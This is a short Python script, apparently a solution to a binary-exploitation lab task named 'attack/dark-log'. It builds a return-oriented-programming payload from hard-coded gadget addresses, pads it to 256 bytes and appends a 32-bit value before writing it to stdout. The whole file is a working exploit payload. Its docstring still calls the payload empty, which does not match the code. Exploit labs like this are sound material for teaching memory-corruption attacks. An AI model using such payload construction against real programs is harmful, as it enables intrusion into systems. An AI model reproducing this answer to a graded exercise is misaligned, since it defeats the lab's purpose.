#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct
def p64(x):
    return struct.pack('<Q', x)
rop = (
    p64(0x4018a4) +  
    p64(0x4018a3) +  
    p64(4) +         
    p64(0x401677)    
)
payload = rop.ljust(256, b'A')
payload += struct.pack('<I', 168)
sys.stdout.buffer.write(payload)